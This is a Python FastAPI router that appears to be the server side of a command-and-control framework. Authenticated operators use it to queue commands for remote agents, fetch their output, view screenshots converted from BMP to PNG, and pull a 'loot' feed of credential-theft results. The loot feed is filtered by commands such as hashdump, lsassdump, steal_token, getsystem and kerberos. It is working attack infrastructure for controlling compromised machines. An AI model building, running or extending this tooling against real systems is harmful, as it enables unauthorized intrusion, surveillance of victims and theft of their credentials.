"""
POST /agents/{id}/task    — queue a command for an agent
GET  /agents/{id}/output  — get output of last completed task
GET  /agents/{id}/tasks   — list all tasks for an agent
GET  /logs                — full audit log
"""
import base64
import io
import uuid
from datetime import datetime
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from sqlalchemy.orm import Session

from routers.auth import verify_token
from models.agent import Agent
from models.task import Task
from models.log import Log
from database import get_db

try:
    from PIL import Image as _PILImage, ImageFile as _PILImageFile
    _PILImageFile.LOAD_TRUNCATED_IMAGES = True
    _HAS_PIL = True
except ImportError:
    _HAS_PIL = False


def _extract_b64(raw: str) -> str:
    """Strip '[screenshot] WxH\n' header if present, return raw b64."""
    if raw and raw.startswith('[screenshot] ') and '\n' in raw:
        return raw.split('\n', 1)[1].strip()
    return (raw or '').strip()


def _bmp_b64_to_png_b64(raw: str) -> str:
    """Convert BMP base64 → PNG base64 using Pillow.
    Falls back to the raw BMP base64 if PIL is unavailable or conversion fails."""
    b64 = _extract_b64(raw)
    if not _HAS_PIL or not b64:
        return b64
    try:
        bmp_bytes = base64.b64decode(b64)
        img = _PILImage.open(io.BytesIO(bmp_bytes))
        out = io.BytesIO()
        img.save(out, format='PNG', optimize=False)
        return base64.b64encode(out.getvalue()).decode()
    except Exception:
        return b64  # fallback to BMP base64

router = APIRouter(tags=["tasks"])


# ---- Request / Response models ----

class TaskRequest(BaseModel):
    cmd:     str
    args:    str    = ""
    data_b64: str   = ""  # base64 file content for upload command


class TaskResponse(BaseModel):
    task_id:  str
    agent_id: str
    cmd:      str
    args:     str
    status:   str


# ---- Routes ----

@router.post("/agents/{agent_id}/task", response_model=TaskResponse)
async def create_task(
    agent_id: str,
    body:     TaskRequest,
    db:       Session = Depends(get_db),
    _user:    str     = Depends(verify_token),
):
    agent = db.get(Agent, agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    if not agent.handshake_done:
        raise HTTPException(status_code=409, detail="Agent handshake not complete")

    task = Task(
        task_id  = str(uuid.uuid4()),
        agent_id = agent_id,
        cmd      = body.cmd,
        args     = body.args,
        data_b64 = body.data_b64,
        status   = "pending",
    )
    log = Log(agent_id=agent_id, event="task_created",
              detail=f"cmd={body.cmd} args={body.args[:64]}")
    db.add(task)
    db.add(log)
    db.commit()
    db.refresh(task)

    return TaskResponse(
        task_id  = task.task_id,
        agent_id = task.agent_id,
        cmd      = task.cmd,
        args     = task.args,
        status   = task.status,
    )


@router.get("/agents/{agent_id}/output")
async def get_output(
    agent_id: str,
    db:       Session = Depends(get_db),
    _user:    str     = Depends(verify_token),
):
    """Return the most recently ACK'd task with its output."""
    task = (
        db.query(Task)
        .filter(Task.agent_id == agent_id, Task.status == "acked")
        .order_by(Task.acked_at.desc())
        .first()
    )
    if not task:
        return {"output": None}
    return task.to_dict()


@router.get("/agents/{agent_id}/tasks")
async def list_tasks(
    agent_id: str,
    db:       Session = Depends(get_db),
    _user:    str     = Depends(verify_token),
):
    tasks = (
        db.query(Task)
        .filter(Task.agent_id == agent_id)
        .order_by(Task.created_at.desc())
        .limit(100)
        .all()
    )
    return [t.to_dict() for t in tasks]


@router.get("/tasks/{task_id}")
async def get_task(
    task_id: str,
    db:      Session = Depends(get_db),
    _user:   str     = Depends(verify_token),
):
    task = db.get(Task, task_id)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return task.to_dict()


_LOOT_CMDS = ('hashdump', 'lsassdump', 'steal_token', 'make_token', 'getsystem', 'download', 'kerberos')


@router.get("/screenshots")
async def get_screenshots(
    limit:    int           = 100,
    agent_id: Optional[str] = None,
    db:       Session       = Depends(get_db),
    _user:    str           = Depends(verify_token),
):
    q = db.query(Task).filter(Task.cmd == "screenshot", Task.status == "acked", Task.output != "")
    if agent_id:
        q = q.filter(Task.agent_id == agent_id)
    tasks = q.order_by(Task.acked_at.desc()).limit(limit).all()
    return [
        {"task_id": t.task_id, "agent_id": t.agent_id,
         "acked_at": t.acked_at.isoformat() if t.acked_at else None,
         "output": _bmp_b64_to_png_b64(t.output),
         "mime": "image/png" if _HAS_PIL else "image/bmp"}
        for t in tasks
    ]


@router.get("/loot")
async def get_loot(
    agent_id: Optional[str] = None,
    db:       Session       = Depends(get_db),
    _user:    str           = Depends(verify_token),
):
    q = db.query(Task).filter(Task.cmd.in_(_LOOT_CMDS), Task.status == "acked", Task.output != "")
    if agent_id:
        q = q.filter(Task.agent_id == agent_id)
    tasks = q.order_by(Task.acked_at.desc()).limit(500).all()
    return [t.to_dict() for t in tasks]


@router.get("/logs")
async def get_logs(
    agent_id: Optional[str] = None,
    limit:    int           = 200,
    db:       Session       = Depends(get_db),
    _user:    str           = Depends(verify_token),
):
    q = db.query(Log)
    if agent_id:
        q = q.filter(Log.agent_id == agent_id)
    logs = q.order_by(Log.created_at.desc()).limit(limit).all()
    return [l.to_dict() for l in logs]
